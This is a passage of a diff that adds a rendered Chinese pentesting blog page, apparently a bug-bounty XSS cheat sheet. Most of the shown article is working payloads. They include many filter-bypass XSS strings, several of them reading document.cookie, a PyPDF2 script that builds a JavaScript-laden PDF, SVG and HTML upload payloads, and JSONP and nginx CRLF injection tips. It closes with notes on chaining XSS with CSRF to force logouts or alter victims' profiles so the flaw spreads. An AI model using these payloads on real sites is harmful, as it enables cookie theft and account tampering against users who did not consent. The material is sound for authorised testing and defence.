+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">svg</span><span class="o">%</span><span class="mi">20</span><span class="n">onmouseover</span><span class="o">&amp;</span><span class="mi">0</span><span class="n">A</span><span class="o">=</span><span class="mi">0</span><span class="n">Aa</span><span class="o">=</span><span class="n">confirm</span><span class="p">,</span><span class="n">a</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">svg</span><span class="o">%</span><span class="mi">0</span><span class="n">Aonmouseover</span><span class="o">&amp;</span><span class="mi">0</span><span class="n">A</span><span class="o">=&amp;</span><span class="mi">0</span><span class="n">Aa</span><span class="o">=</span><span class="n">confirm</span><span class="p">,</span><span class="n">a</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="n">x</span><span class="o">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">svg</span><span class="o">&amp;</span><span class="mi">20</span><span class="n">onmouseover</span><span class="o">&amp;</span><span class="mi">0</span><span class="n">A</span><span class="o">=&amp;</span><span class="mi">0</span><span class="n">Aa</span><span class="o">=</span><span class="n">confirm</span><span class="p">,</span><span class="n">a</span><span class="p">(</span><span class="n">document</span><span class="o">.</span><span class="n">cookie</span><span class="p">)</span><span class="o">&gt;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;+onclick=a=alert,a(1)</span><span class="si">%2F%2F</span><span class="s1">  </span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;+onclick=a=alert,a(1)--+  </span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;+onclick=a=confirm,a(1)--+  </span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;+onclick=a=confirm,a(1)</span><span class="si">%2F%2F</span><span class="s1">  </span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;%27+onclick=&#39;</span><span class="n">a</span><span class="o">=</span><span class="n">alert</span><span class="p">,</span><span class="n">a</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="s1">&#39;--+  </span>
+</span></span><span class="line"><span class="cl"><span class="err">在对</span><span class="n">xss</span> <span class="err">标签进行注释的时候要使用</span><span class="o">--+</span><span class="err">和</span><span class="o">//</span> <span class="err">，经测试</span><span class="o">%</span><span class="mi">23</span><span class="err">无效。如果</span><span class="n">onload不能用就换成其他属性</span><span class="err">。</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">marquee</span> <span class="n">behavior</span><span class="o">=</span><span class="s2">&#34;alternate&#34;</span> <span class="n">onstart</span><span class="o">=</span><span class="n">alert</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">123</span><span class="o">&lt;/</span><span class="n">marquee</span><span class="o">&gt;&lt;</span><span class="n">MaRQuEe</span> <span class="n">BehAvIor</span><span class="o">=</span><span class="s2">&#34;alternate&#34;</span> <span class="n">onStArt</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">123</span><span class="o">&lt;/</span><span class="n">MaRQuEe</span><span class="o">&gt;&lt;</span><span class="n">body</span> <span class="n">onpageshow</span><span class="o">=</span><span class="n">alert</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">body</span> <span class="n">onPAgeShoW</span><span class="o">=</span><span class="n">confirm</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="o">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">details</span> <span class="n">ontoggle</span><span class="o">=</span><span class="n">alert</span> <span class="p">()</span><span class="o">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="err">向下按钮</span> <span class="n">xss</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">SVg</span> <span class="o">&lt;/</span><span class="n">onLoaD</span> <span class="o">=</span><span class="s2">&#34;1&gt; (_=prompt,_(1)) &#34;&#34;&gt;  </span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="n">eval</span> <span class="p">(</span><span class="n">atob</span><span class="p">(</span><span class="s1">&#39;YWxlcnQoZG9jdw1lbnQuY29va211KTs=&#39;</span><span class="p">));</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">d3</span><span class="s2">&#34;&lt;&#34;</span><span class="o">/</span><span class="n">onclick</span><span class="o">=</span><span class="s2">&#34;1&gt;[confirm`&#34;</span><span class="p">]</span><span class="s2">&#34;&lt;&#34;</span><span class="o">&gt;</span><span class="n">dianwo</span>  
+</span></span><span class="line"><span class="cl"><span class="err">需要点击</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">w</span><span class="o">=</span><span class="s2">&#34;/x=&#34;</span><span class="n">y</span><span class="o">&gt;</span><span class="s2">&#34;/oNCliCk=`&lt;`[confir</span><span class="se">\u006d</span><span class="s2">&#34;</span><span class="err">`</span><span class="p">]</span><span class="o">&gt;</span><span class="n">dianwo</span><span class="o">&lt;</span><span class="n">w</span><span class="o">=</span><span class="s2">&#34;/x=&#34;</span><span class="n">y</span><span class="o">&gt;</span><span class="s2">&#34;/ondblclick=&lt;^[confir</span><span class="se">\u006d</span><span class="s2">``]&gt;dianwo2双击  </span>
+</span></span><span class="line"><span class="cl"><span class="err">需要点击</span>  
+</span></span><span class="line"><span class="cl"><span class="err">需要</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">w</span><span class="o">=</span><span class="s2">&#34;/x=&#34;</span><span class="n">y</span><span class="o">&gt;</span><span class="s2">&#34;/oNDb1CliCk=`&lt;`[confir</span><span class="se">\u006d</span><span class="s2">`]&gt;dianwo2双击  </span>
+</span></span><span class="line"><span class="cl"><span class="err">需要</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;!*/*</span><span class="s2">&#34;/*/*/*/&#34;</span><span class="o">/*--&gt;&lt;/</span><span class="ne">Script</span><span class="o">&gt;&lt;</span><span class="ne">Image</span> <span class="n">SrcSet</span><span class="o">=</span><span class="n">K</span> <span class="o">*/</span> <span class="p">;</span><span class="n">OnError</span><span class="o">=</span><span class="n">confirm</span><span class="o">^</span><span class="mi">1</span><span class="err">`</span> <span class="o">//&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">img</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">onerror</span><span class="o">=</span>\<span class="n">u0061</span>\<span class="n">u006c</span>\<span class="n">u0065</span>\<span class="n">u0072</span>\<span class="n">u0074</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;&lt;</span><span class="n">object</span> <span class="n">data</span><span class="o">=</span><span class="n">javascript</span><span class="p">:</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">svg</span> <span class="n">onload</span><span class="o">=</span><span class="n">setInterval</span><span class="err">`</span><span class="n">alert</span>\<span class="n">x28document</span><span class="o">.</span><span class="n">domain</span>\<span class="n">x29</span><span class="err">`</span><span class="o">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="mi">1</span> <span class="n">onerror</span><span class="o">=</span><span class="n">javascript</span><span class="p">:</span> <span class="p">{{</span><span class="o">.</span> <span class="p">(</span><span class="s1">&#39;alert(1)) ()}}&gt;&lt;a href=javascript: {{. (&#39;</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s1">&#39;) ()))&gt;dianwo&lt;/a&gt;  </span>
+</span></span><span class="line"><span class="cl"><span class="err">点击一次</span>  
+</span></span><span class="line"><span class="cl"><span class="err">点击一次</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="n">javascript</span><span class="p">:</span><span class="o">&lt;</span><span class="n">x</span> <span class="n">ng</span><span class="o">-</span><span class="n">app</span><span class="o">&gt;</span><span class="p">{{</span><span class="o">.</span> <span class="p">(</span><span class="s1">&#39;alert(1) ;) ()}}&gt;dianwo&lt;/a&gt;点击一次  </span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="n">javascript</span><span class="p">:{{</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;alert(1)&#39;</span><span class="p">)()}}</span><span class="o">&gt;</span><span class="n">dianwo</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span><span class="err">点击一次</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">d3</span><span class="s2">&#34;&lt;&#34;</span><span class="o">/</span><span class="n">onclick</span><span class="o">=</span><span class="s2">&#34;1&gt;[confirm``]&#34;</span><span class="o">&lt;</span><span class="s2">&#34;&gt;dianwo 点击一次  </span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">d3</span><span class="s2">&#34;&lt;&#34;</span><span class="o">/</span><span class="n">oNDblCliCk</span><span class="o">=</span><span class="s2">&#34;1&gt;[confirm``]&#34;</span><span class="o">&lt;</span><span class="s2">&#34;&gt;dianwo 需要双击  </span>
+</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="mi">00</span><span class="n">EEEE</span><span class="o">&lt;</span><span class="n">svg</span><span class="o">/</span>\<span class="o">/</span>\<span class="o">//</span><span class="n">ONLoad</span><span class="o">=</span><span class="s1">&#39;a</span><span class="se">\u006c\u0065\u0072\u0074</span><span class="s1">(1)&#39;</span><span class="o">/</span>\<span class="o">/</span>\<span class="o">/</span>\<span class="o">&gt;</span><span class="n">svg</span><span class="o">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">svg</span><span class="o">&gt;&lt;</span><span class="n">set</span> <span class="n">end</span><span class="o">=</span><span class="mi">1</span> <span class="n">onend</span><span class="o">=</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">alert</span><span class="p">)</span><span class="o">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">body</span> <span class="n">onpageshow</span><span class="o">=</span><span class="s2">&#34;alert(1)&#34;</span><span class="o">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">detail</span> <span class="n">open</span> <span class="n">ontoggle</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>  <span class="err">可能不会弹窗</span> <span class="err">但也会有</span><span class="n">xss</span>   
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">details</span> <span class="n">open</span> <span class="n">ontoggle</span><span class="o">=</span>\<span class="n">u0061</span>\<span class="n">u006c</span>\<span class="n">u0065</span>\<span class="n">u0072</span>\<span class="n">u0074</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">details</span><span class="o">%</span><span class="mi">20</span><span class="n">ontoggle</span><span class="o">=</span><span class="n">confirm</span><span class="p">()</span><span class="o">&gt;//</span>  
+</span></span><span class="line"><span class="cl"><span class="c1">#弹窗！</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上面的只要通杀 全是高危 甚至严重。</p>
+<h1 id="5pdfxss低-无危害">5. pdfxss:低-无危害</h1>
+<p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302125150.png" alt="image.png"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">PyPDF2</span> <span class="n">import</span> <span class="n">PdfWriter</span>
+</span></span><span class="line"><span class="cl"><span class="n">writer</span> <span class="o">=</span> <span class="n">PdfWriter</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">writer</span><span class="o">.</span><span class="n">add_js</span><span class="p">(</span><span class="s2">&#34;app.alert(document.cookie);&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">with</span> <span class="n">open</span><span class="p">(</span><span class="s2">&#34;xss_payload.pdf&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="n">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">   <span class="n">writer</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="6htmlxss中-低危">6. htmlxss:中-低危</h1>
+<p>上传一个html文件：<br>
+内容为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;script&gt;alert(1)&lt;/script&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="7svgxss中-低危">7. svgxss:中-低危</h1>
+<p>创建一个svg文件 内容如下 然后传上去就完事了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;svg xmlns=&#34;http://www.w3.org/2000/svg”version=&#34;1.1&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;circle cx=&#34;100&#34;cy=&#34;50&#34;r=&#34;40&#34;stroke=&#34;black”stroke-width=&#34;2&#34;fill=&#34;red&#34;/&gt;
+</span></span><span class="line"><span class="cl">&lt;script&gt;alert(1)&lt;/script&gt;
+</span></span><span class="line"><span class="cl">&lt;/svg&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="8其他xss">8. 其他xss:</h1>
+<h2 id="81swagger--xss">8.1. swagger -xss</h2>
+<p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302125441.png" alt="image.png"><br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302125453.png" alt="image.png"></p>
+<h2 id="82jsonp">8.2. jsonp:</h2>
+<p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302125508.png" alt="image.png"><br>
+这里直接更改jsoncallback=后面的值就可以了<br>
+有时候也叫callback<br>
+可以混一个漏洞~~ 主站基本就是高危 旁站低危</p>
+<h2 id="83nginx">8.3. nginx：</h2>
+<p>回车换行漏洞：<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302125541.png" alt="image.png"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">第一次回车换行为插入到cookie位置的栏 写一次%0a%0d
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302125711.png" alt="image.png"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">第二次回车换行为插入到返回包渲染位置的栏</span> <span class="err">写两次</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span>
+</span></span><span class="line"><span class="cl"><span class="err">也就是说可以直接写入</span><span class="n">xsspayload</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>浏览器渲染了就是有漏洞</p>
+<h2 id="84编辑器处的链接xss">8.4. 编辑器处的链接xss:</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;&lt;script&gt;alert(1)&lt;/script&gt;
+</span></span><span class="line"><span class="cl">&lt;script&gt;alert(2)&lt;/script&gt;
+</span></span><span class="line"><span class="cl">medium--&gt; É‹•&#39;Ê£ˆý£ˆ&lt;sc&lt;script&gt;ript&gt;alert(4)&lt;/script&gt;
+</span></span><span class="line"><span class="cl">&#39;6b;P&#34;&gt;iIÝÉ‡&#39;ý£ˆ&lt;ScRiPt&gt;alert(5)&lt;/script&gt;
+</span></span><span class="line"><span class="cl">&lt;img src=1 onerror=alert(7)&gt;
+</span></span><span class="line"><span class="cl">onmouseover=¡⁻alert(9)¡⁻
+</span></span><span class="line"><span class="cl">&lt;script&gt;alert(11);&lt;/script&gt;
+</span></span><span class="line"><span class="cl">&gt;&#34;&#39;&gt;&lt;img src=&#34;javascript.:alert(12)&#34;&gt;
+</span></span><span class="line"><span class="cl">&gt;&#34;&gt;&lt;script&gt;alert(13)&lt;/script&gt;
+</span></span><span class="line"><span class="cl">&lt;table background=&#39;javascript.:alert(14)&#39;&gt;&lt;/table&gt;
+</span></span><span class="line"><span class="cl">&lt;object type=text/html
+</span></span><span class="line"><span class="cl">data=&#39;javascript.:alert(15);&#39;&gt;&lt;/object&gt;
+</span></span><span class="line"><span class="cl">  &#34;+alert(16)+&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302125915.png" alt="image.png"></p>
+<h2 id="85xsscsrf">8.5. xss+csrf：</h2>
+<p>csrf：让用户在不知情的情况下，访问一些会对用户造成影响的路径<br>
+比如：支付 转账 登陆退出 更改账密 更改头像等<br>
+xss：网站没有对用户的输入进行过滤 导致可以实现用户输入的内容被当作javascript进行执行。<br>
+javascript可以实现对指定网站指定路径的访问。<br>
+所以只要使用xss实现csrf就会出现很多更高危害的漏洞<br>
+例如：<br>
+当用户查看你的头像 或者加载了你的昵称的时候 让他直接登录退出，或者改成你的头像，昵称等 进一步传播这个漏洞。<br>
+这里是一个大佬的记录：<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260302125942.png" alt="image.png"></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/pocapache-struts-xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2025-68493/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/115.webp" loading="lazy" data-key="" data-hash="/images/115.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【POC】Apache Struts XML外部实体注入漏洞(CVE-2025-68493)</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BC%9A%E8%AF%9D%E5%A4%8D%E7%94%A8%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/112.webp" loading="lazy" data-key="" data-hash="/images/112.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【渗透测试】会话复用漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/app%E6%8A%93%E5%8C%85%E9%80%8D%E9%81%A5%E6%A8%A1%E6%8B%9F%E5%99%A8-burp%E5%AE%9E%E7%8E%B0app%E6%8A%93%E5%8C%85/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/111.webp" loading="lazy" data-key="" data-hash="/images/111.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【APP抓包】逍遥模拟器&#43;burp实现APP抓包</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95js%E8%84%9A%E6%9C%AC%E4%BF%9D%E5%AD%98%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%88%9D%E5%A7%8B%E5%AF%86%E7%A0%81%E4%B8%AD%E5%8D%B1/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/109.webp" loading="lazy" data-key="" data-hash="/images/109.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【渗透测试】JS脚本保存系统默认初始密码（中危）</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AF%86%E7%A0%81%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%8A%9F%E8%83%BD%E8%AE%BE%E8%AE%A1%E7%BC%BA%E5%A4%B1%E4%B8%AD%E5%8D%B1/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/108.webp" loading="lazy" data-key="" data-hash="/images/108.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【渗透测试】密码复杂度功能设计缺失（中危）</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+    
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2026 Slimer
+    </section>
+        
+    <section class="runtime" style="margin-top:8px;font-size:1.3rem">
+        <span id="site-runtime">站点已运行计算中...</span>
+    </section>
+    <script>
+      (function(){
+        var sinceStr = '2025-08-25T00:00:00'.replace('T',' ').replace('t',' ');
+        var start = new Date(sinceStr);
+        function update(){
+          var now = new Date();
+          var diff = Math.max(0, now - start);
+          var days = Math.floor(diff / (24*60*60*1000));
+          var hours = Math.floor((diff % (24*60*60*1000)) / (60*60*1000));
+          var mins = Math.floor((diff % (60*60*1000)) / (60*1000));
+          var secs = Math.floor((diff % (60*1000)) / 1000);
+          var el = document.getElementById('site-runtime');
+          if(el){ el.textContent = '站点已运行 ' + days + ' 天 ' + hours + ' 小时 ' + mins + ' 分 ' + secs + ' 秒'; }
+        }
+        update();
+        setInterval(update, 1000);
+      })();
+    </script>
+    
+	
+    <section class="powerby">
+        
+        
+        
+    </section>
+</footer>
+
+
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.310d38c99963e86c53c43232d9b04e101a98b09425c2fb12195e655db9e34368.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+ <style>
+    body {
+      background: url(http://localhost:1313/background/bz.webp) no-repeat center top;
+      background-size: cover;
+      background-attachment: fixed;
+      backdrop-filter: blur(50px);
+      -webkit-backdrop-filter: blur(50px);  
+    }
+  </style>
+
+<style>
+  @font-face {
+    font-family: 'youyuan';
+    src: url(http://localhost:1313/font/youyuan.woff2) format('truetype');
+  }
+
+  :root {
+    --base-font-family: 'youyuan';
+    --code-font-family: 'youyuan';
+  }
+</style>
+
+<script src=http://localhost:1313/background/sakura.js></script>
+
+
+    </body>
+</html>
